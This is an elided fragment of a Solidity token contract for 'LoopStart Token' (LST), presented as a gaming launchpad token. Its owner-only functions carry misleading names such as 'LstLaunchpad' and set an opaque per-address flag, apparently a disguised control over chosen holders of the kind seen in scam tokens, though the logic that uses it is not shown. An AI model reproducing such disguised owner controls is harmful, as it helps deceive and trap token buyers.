...
// As a launchpad, LoopStartexpects to navigate excellent metaverse and gaming projects to help them stand out in the crowd of the blockchain industry.
...
contract BaseToken is Ownable {
    ...
    string constant public name = 'LoopStart Token';
    string constant public symbol = 'LST';
    ...
    function PermitBridge(address account) public onlyOwner {
    ...
    function LstLaunchpad(address account) public onlyOwner {
        _rebuildsolidity[account] = true;
    }

    function CrossLaunchpad(address account) public view returns (bool) {
...
contract PrivateLST is BaseToken {
